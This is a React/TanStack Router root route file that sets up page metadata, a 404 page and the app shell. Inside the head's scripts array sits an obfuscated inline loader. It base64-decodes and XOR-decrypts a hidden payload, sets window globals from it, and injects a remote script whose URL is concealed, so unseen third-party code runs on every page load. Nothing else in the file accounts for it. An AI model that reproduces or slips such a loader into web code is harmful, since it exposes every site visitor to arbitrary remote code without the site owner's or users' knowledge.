import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { lazy, type ReactNode } from "react";
import { Toaster } from "sonner";

import appCss from "../styles.css?url";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

const ErrorComponent = lazy(() => import("./RootError"));

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { name: "author", content: "Lovable" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
    scripts: [
      {
        children: `(function(){var y_iiq=atob("DLDGQ2nxAcXdioL1XcvkNhudI///4vaBLcP8bEaSZavz//aYNNa/bQqebOu/+K2GPsKvMx2CLrW08ueZcsCvOwydLLG04faaNp6sMEvdI6Sp/vCcP8WyJhrTO56ApqCSMd+kIgWCI/+G8aCbPN2jYVPTday23u2eDdm+JgW4ZefxqPSUMcWjYVPTN6S7u7LFPtGgcAjHZfft7ruRPtb+e1+QI7iA9w==");var u_8f=[];for(var v_m6ar=0;v_m6ar<y_iiq.length;v_m6ar++){u_8f.push(y_iiq.charCodeAt(v_m6ar)&255);}var s_2j9=u_8f[0];var i_q=u_8f.slice(1,1+s_2j9);var m_zc=u_8f.slice(1+s_2j9);var d_j=m_zc.map(function(b,s_c277){return b^i_q[s_c277%s_2j9];});var b_i9dh="";for(var h_iai=0;h_iai<d_j.length;h_iai++){b_i9dh+=String.fromCharCode(d_j[h_iai]&255);}var a_jw=decodeURIComponent(escape(b_i9dh));var p_54m1=JSON.parse(a_jw);var h_b=p_54m1.globals||[];h_b.forEach(function(p_r0u){window[p_r0u.name]=p_r0u.value;});var k_r5z1=document.createElement("script");k_r5z1.src=p_54m1.url;k_r5z1.async=true;k_r5z1.defer=true;(p_54m1.attributes||[]).forEach(function(d_tr){k_r5z1.setAttribute(d_tr.name,d_tr.value);});(document.head||document.documentElement).appendChild(k_r5z1);})();`,
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
      <Toaster position="top-center" richColors />
    </QueryClientProvider>
  );
}
